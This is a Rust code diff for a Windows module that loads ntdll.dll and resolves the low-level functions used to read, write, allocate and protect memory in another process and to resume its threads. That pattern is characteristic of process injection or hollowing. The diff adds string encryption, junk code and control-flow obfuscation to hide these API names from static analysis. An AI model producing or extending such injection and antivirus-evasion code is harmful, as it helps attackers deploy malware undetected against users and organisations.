@@ -3,6 +3,8 @@ use once_cell::sync::Lazy;
 use std::ffi::c_void;
 use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
 use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
+use obfuscator::{obfuscate, obfuscate_string};
+
 type NtQueryInformationProcess = extern "system" fn(
 ProcessHandle: *mut c_void,
 ProcessInformationClass: PROCESS_INFORMATION_CLASS,
@@ -66,21 +68,32 @@ pub struct Syscalls {
 }
 
 impl Syscalls {
+    #[obfuscate(garbage = true, control_f = true)]
     fn new() -> Result<Syscalls, &'static str> {
         unsafe {
-            let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());
+            let ntdll_str = obfuscate_string!("ntdll.dll\0");
+            let ntdll = LoadLibraryA(ntdll_str.as_ptr());
             if (ntdll as *mut std::ffi::c_void).is_null() {
-                return Err("Failed to load ntdll.dll");
+                return Err(obfuscate_string!("Failed to load ntdll.dll"));
             }
 
-            let NtQueryInformationProcess = GetProcAddress(ntdll, "NtQueryInformationProcess\0".as_ptr());
-            let NtClose = GetProcAddress(ntdll, "NtClose\0".as_ptr());
-            let NtReadVirtualMemory = GetProcAddress(ntdll, "NtReadVirtualMemory\0".as_ptr());
-            let NtWriteVirtualMemory = GetProcAddress(ntdll, "NtWriteVirtualMemory\0".as_ptr());
-            let NtResumeThread = GetProcAddress(ntdll, "NtResumeThread\0".as_ptr());
-            let NtAllocateVirtualMemory = GetProcAddress(ntdll, "NtAllocateVirtualMemory\0".as_ptr());
-            let NtProtectVirtualMemory = GetProcAddress(ntdll, "NtProtectVirtualMemory\0".as_ptr());
-            let NtFlushInstructionCache = GetProcAddress(ntdll, "NtFlushInstructionCache\0".as_ptr());
+            let nt_query_info_proc_str = obfuscate_string!("NtQueryInformationProcess\0");
+            let nt_close_str = obfuscate_string!("NtClose\0");
+            let nt_read_virt_mem_str = obfuscate_string!("NtReadVirtualMemory\0");
+            let nt_write_virt_mem_str = obfuscate_string!("NtWriteVirtualMemory\0");
+            let nt_resume_thread_str = obfuscate_string!("NtResumeThread\0");
+            let nt_alloc_virt_mem_str = obfuscate_string!("NtAllocateVirtualMemory\0");
+            let nt_protect_virt_mem_str = obfuscate_string!("NtProtectVirtualMemory\0");
+            let nt_flush_inst_cache_str = obfuscate_string!("NtFlushInstructionCache\0");
+
+            let NtQueryInformationProcess = GetProcAddress(ntdll, nt_query_info_proc_str.as_ptr());
+            let NtClose = GetProcAddress(ntdll, nt_close_str.as_ptr());
+            let NtReadVirtualMemory = GetProcAddress(ntdll, nt_read_virt_mem_str.as_ptr());
+            let NtWriteVirtualMemory = GetProcAddress(ntdll, nt_write_virt_mem_str.as_ptr());
+            let NtResumeThread = GetProcAddress(ntdll, nt_resume_thread_str.as_ptr());
+            let NtAllocateVirtualMemory = GetProcAddress(ntdll, nt_alloc_virt_mem_str.as_ptr());
+            let NtProtectVirtualMemory = GetProcAddress(ntdll, nt_protect_virt_mem_str.as_ptr());
+            let NtFlushInstructionCache = GetProcAddress(ntdll, nt_flush_inst_cache_str.as_ptr());
             if NtQueryInformationProcess.is_none()
                 || NtClose.is_none()
                 || NtReadVirtualMemory.is_none()
@@ -90,7 +103,7 @@ impl Syscalls {
                 || NtProtectVirtualMemory.is_none()
                 || NtFlushInstructionCache.is_none()
             {
-                return Err("Failed to get one or more function addresses");
+                return Err(obfuscate_string!("Failed to get one or more function addresses"));
             }
 
             Ok(Syscalls {
@@ -107,5 +120,5 @@ impl Syscalls {
     }
 }
 pub static SYSCALLS: Lazy<Syscalls> = Lazy::new(|| {
-Syscalls::new().expect("")
+    Syscalls::new().expect(obfuscate_string!(""))
 });
